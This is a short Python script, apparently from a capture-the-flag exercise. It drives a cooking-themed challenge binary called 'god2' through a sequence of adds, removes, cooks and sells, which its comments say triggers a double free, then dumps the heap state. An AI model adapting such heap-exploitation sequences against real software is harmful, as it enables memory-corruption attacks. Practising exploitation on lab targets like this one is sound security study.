import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
from dumper import G
g=G('god2')
g.add(b'UNIQ777', (b'0',))
g.add(b'A1'); g.add(b'B2'); g.cook(b'Beef noodles'); g.add(b'YY'); g.add(b'Z9'); g.cook(b'Beef noodles')
for t in (b'B2',b'Z9',b'A1',b'YY'): g.rm(t)
g.add(b'CC')
g.cook(b'Beef noodles'); g.cook(b'Beef noodles'); g.cook(b'UNIQ777')  # D1(2),D2(3),D3(4)@YY
g.cook(b'Beef noodles')                 # E(5) cooked BEFORE freeing D3
g.rm(b'UNIQ777'); g.rm(b'UNIQ777')      # free recipe, then free D3-as-recipe
g.sell(b'5')                            # free E
g.sell(b'4')                            # free D3 again -> double free
g.dump('dish double-free (E before)')
g.close()
